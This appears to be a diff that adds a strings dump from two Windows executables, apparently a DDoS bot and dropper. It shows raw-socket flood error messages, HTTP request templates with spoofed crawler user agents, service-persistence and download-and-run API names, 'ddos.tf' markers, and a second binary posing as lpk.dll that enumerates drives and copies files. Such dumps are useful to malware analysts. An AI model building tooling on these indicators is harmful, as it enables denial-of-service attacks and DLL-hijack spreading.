@@ -1,0 +1,512 @@
+!This program cannot be run in DOS mode.
+|Rich
+.text
+`.rdata
+@.data
+.rsrc
+#<a|
+BBIu
+(VWj
+h`q@
+SVWh
+h9h7(
+9h7(P
+Dj(X
+j	SW
+_^[d
+SVWj	j
+j	SW
+j	SW
+j	SW
+j	SW
+PPQPP
+VjSP
+VWj	
+SVWh
+BRh,
+SUVWj	j
+j	SW
+]j	SW
+j	SW
+j	SW
+D$ P
+D$ Pj
+j	SW
+_^][
+SVWh
+SVWh
+hxV4
+Y_^3
+SVWh
+SVWh
+_^[U
+SVWh
+_^[U
+SVWh
+SVWh
+SVWj@3
+j	SW
+j8h8
+PPPh0
+SUVWj	j
+j	VU
+WWVh
+WWVh
+WWVh~,@
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+WWVh
+~nWWVh~,@
+E9=@
+~*WWVh
+WWVh
+WWVh~,@
+WWVh
+WWVh
+WWVhD8@
+WWVh
+_^][
+SUVWj	j
+j	US
+j	US
+j	US
+_WUV
+j	US
+j	US
+j	US
+j	US
+D$PP
+j	US
+D$,j
+_^][
+j	SW
+_^[d
+YYj	j
+V@QP
+Ht4Ht
+VVVhzE@
+j@Y3
+VVVh=G@
+Y=0x3
+PPPhYM@
+YYj	j
+V@QP
+Ht4Ht
+VVVhzE@
+j@Y3
+SUVW
+j	SW
+D$ h
+j	SW
+j	SW
+j	SW
+t$$U
+j	SW
+X_^][
+VWj	
+SUVWj	j
+D$$h
+j	SW
+D$$hn
+j	SW
+D$,UPh
+j	SW
+j	SW
+D$XUP
+j	SW
+D$ P
+D$(PUUh
+j	SW
+D$$P
+j	SW
+D$$UUj
+j	SW
+tfj	SW
+t4Pj@
+j	SW
+Ujfj
+@PSUjej
+_^][
+SVWh
+WWWh
+WWWh
+WWWh"N@
+_^[]
+SVWj@3
+h`q@
+SVWj	j
+j	VW
+j	VW
+j	VW
+j	VW
+j	VW
+j	VW
+j	VW
+j	VW
+j	VW
+SSSSS
+j,QS
+j Pj
+X_^[
++O i
+h`q@
+hSVW
+>"u:F
+XPVSS
+GetProcAddress
+LoadLibraryA
+GetTickCount
+Sleep
+ExitThread
+GetCurrentProcess
+lstrcpyA
+GetCurrentProcessId
+CloseHandle
+CreateThread
+MoveFileExA
+MoveFileA
+GetTempPathA
+GetModuleFileNameA
+WinExec
+GetSystemDefaultUILanguage
+GetComputerNameA
+GetSystemInfo
+WaitForSingleObject
+WriteFile
+CreateFileA
+LockResource
+LoadResource
+SizeofResource
+FindResourceA
+EnumResourceNamesA
+EndUpdateResourceA
+lstrlenA
+UpdateResourceA
+BeginUpdateResourceA
+GlobalFree
+ReadFile
+GlobalAlloc
+GetFileSize
+GetFileAttributesA
+lstrcatA
+GetLastError
+CopyFileA
+GetModuleHandleA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+RegCloseKey
+RegQueryValueExA
+RegOpenKeyA
+RegOpenKeyExA
+SetServiceStatus
+RegisterServiceCtrlHandlerA
+StartServiceCtrlDispatcherA
+CloseServiceHandle
+RegSetValueExA
+StartServiceA
+OpenServiceA
+UnlockServiceDatabase
+ChangeServiceConfig2A
+LockServiceDatabase
+CreateServiceA
+OpenSCManagerA
+ADVAPI32.dll
+memcpy
+??3@YAXPAX@Z
+strlen
+sprintf
+localtime
+time
+rand
+srand
+memset
+fprintf
+printf
+_except_handler3
+_local_unwind2
+__CxxFrameHandler
+_ftol
+strcpy
+strcat
+strstr
+atoi
+strncmp
+free
+??2@YAPAXI@Z
+MSVCRT.dll
+_iob
+__dllonexit
+_onexit
+_exit
+_XcptFilter
+exit
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+WSASocketA
+WSAIoctl
+WS2_32.dll
+InternetReadFile
+InternetOpenUrlA
+InternetOpenA
+InternetCloseHandle
+WININET.dll
+GetIfTable
+iphlpapi.dll
+GetStartupInfoA
+htons
+WS2_32.dll
+closesocket
+0E22E08EF0CA7A664A34F5624A664BB9F8F512
+ddos.tf
+Pqrstua Cdefgh
+Pqrstu Bcdefgh Jklmnop Rstu
+Pqrs Uabcdef Hijklmnopq S
+%04d%02d%02d
+WS2_32.dll
+WSASocketA
+KERNEL32.dll
+SetProcessWorkingSetSize
+Set IP_HDRINCL Error!
+WSASocket() failed: %d
+WSAStartup failed: %d
+x=%d, y=%d
+i=%d, j=%d
+%d.%d.%d.%d
+~MHz
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+192.168.1.244
+Send err!
+192.168.1.32
+time err!
+opt err!
+sock err!
+InitWSAStartup Error!
+GET %s HTTP/1.1
+Accept: */*
+Referer: http://%s%s
+Accept-Language: zh-CN
+User-Agent: Mozilla/5.0+(compatible;+Baiduspider/%d.0;++http://www.baidu.com/search/spider.html)
+Accept-Encoding: gzip, deflate
+Host: %s
+DNT: 1
+Connection: Keep-Alive
+POST %s HTTP/1.1
+Accept: */*
+Accept-Language: zh-CN
+Accept-Encoding: gzip, deflate
+User-Agent:Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11
+Host: %s
+GET %s HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+Referer: http://%s%s
+Accept-Language: zh-CN
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+Host: %s
+HEAD %s HTTP/1.1
+Accept: */*
+Accept-Language: zh-CN
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
+Host: %s
+by:myss
+Cache-Control: no-cache
+Referer: http://www.baidu.com
+%.fKb/bps|%d%%
+%s\%x
+URLDownloadToFileA
+urlmon.dll
+\%c%c%c%c%c.exe
+Windows NT
+Windows 2012
+2012
+Windows 8
+Windows 7
+Windows 2008
+2008
+Windows Vista
+Vista
+Windows 2003
+2003
+Windows XP
+Windows 2000
+2000
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+hra%u.dll
+ImagePath
+SYSTEM\CurrentControlSet\Services\
+%c%c%c%c%c%c.exe
+ntdll
+NtQuerySystemInformation
+!This program cannot be run in DOS mode.
+Rich
+`.text
+`.rdata
+@.data
+.CRT
+@.rsrc
+@.reloc
+j@hx1
+Ph`B
+t@WV
+j Ph0B
+ugjD
+PVVVVVV
+Wh0B
+8hu,f
+ru%f
+XVjD3
+PVVVVVV
+QQSVW
+r-+E
+Ph(@
+SVWj`3
+t?Vj
+t'j`
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+X^_]
+FGIu
+ftsWordBreak
+LpkUseGDIWidthCache
+LpkPSMTextOut
+LpkInitialize
+LpkGetTextExtentExPoint
+LpkGetCharacterPlacement
+LpkExtTextOut
+LpkEditControl
+LpkDrawTextEx
+LpkDllInitialize
+LpkTabbedTextOut
+ExitProcess
+GetProcAddress
+LoadLibraryW
+lstrcatW
+GetSystemDirectoryW
+FreeLibrary
+lstrcpynA
+LockResource
+LoadResource
+SizeofResource
+FindResourceW
+CreateProcessW
+CloseHandle
+WriteFile
+CreateFileW
+GetTempFileNameW
+GetTempPathW
+GetLastError
+CreateMutexA
+lstrcmpiW
+GetModuleFileNameW
+GetExitCodeProcess
+TerminateProcess
+WaitForSingleObject
+GetCurrentThreadId
+GetFileAttributesW
+lstrcpyW
+GetTickCount
+GetLogicalDrives
+FindNextFileW
+SetFileAttributesW
+CopyFileW
+FindClose
+FindFirstFileW
+WaitForMultipleObjects
+TerminateThread
+ResumeThread
+SetThreadPriority
+CreateThread
+SetEvent
+CreateEventW
+DisableThreadLibraryCalls
+KERNEL32.dll
+wsprintfW
+USER32.dll
+SHELL32.dll
+PathFindFileNameW
+PathFindExtensionW
+PathAppendW
+PathRemoveFileSpecW
+StrStrIW
+SHRegGetValueW
+SHLWAPI.dll
+IsProcessorFeaturePresent
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+lpk.dll
+LpkEditControl
+LpkDllInitialize
+LpkDrawTextEx
+LpkExtTextOut
+LpkGetCharacterPlacement
+LpkGetTextExtentExPoint
+LpkInitialize
+LpkPSMTextOut
+LpkTabbedTextOut
+LpkUseGDIWidthCache
+ftsWordBreak
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD
+0#0-020<0A0M0R0]0j0t0y0
+1,1D1L1Z1`1g1o1~1
+1	2*272>2Y2
+3(383I3]3t3z3
+4]4g4u4
+4%5*585R5W5d5q5
+6S6y6
+7"747C7X7k7
+9m9s9
+:%:=:_:
+;";;;B;H;O;
+<$<*<
+*0\0t0{0
+1 1j1p1t1x1|1
+2=2g2
+5!5'5.555<5C5J5Q5X5`5h5p5|5
+wwwwp
+wwwwwwp
+wwwwwwwwp
+wwwwwwwwwwp
+wwwwwxwwwwwwp
+wwwwwx
+wwwwwwwp
+wwwwx
+wwwwwww
+wwwwwwp
+wwwwww
+wwww
+wwwxx
+wwwx
+wwxx
